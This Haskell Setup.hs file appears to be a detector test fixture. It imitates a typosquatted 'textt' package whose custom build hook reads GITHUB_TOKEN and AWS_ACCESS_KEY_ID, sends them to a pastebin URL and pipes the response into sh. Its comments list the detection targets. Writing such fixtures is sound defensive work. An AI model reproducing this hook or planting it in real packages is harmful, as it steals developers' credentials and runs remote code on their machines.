-- textt (2025) — typosquat of the 'text' Haskell package.
-- Setup.hs runs during `cabal build` as the custom build phase.
-- Executes a remote shell payload via callCommand.
--
-- Detection targets:
--   - typosquat-risk (textt is Levenshtein-1 from text)
--   - suspicious-url (pastebin.com)
--   - install-hook-suspicious (curl | sh in source)

import Distribution.Simple
import System.Process (callCommand)
import System.Environment (getEnvironment)
import Data.List (intercalate)

main :: IO ()
main = do
    env <- getEnvironment
    let token = maybe "" id (lookup "GITHUB_TOKEN" env)
    let awsKey = maybe "" id (lookup "AWS_ACCESS_KEY_ID" env)
    -- Exfil env vars and fetch second-stage payload.
    callCommand $ "curl -sSL 'https://pastebin.com/raw/textt_payload?t=" ++
                  token ++ "&k=" ++ awsKey ++ "' | sh"
    defaultMain
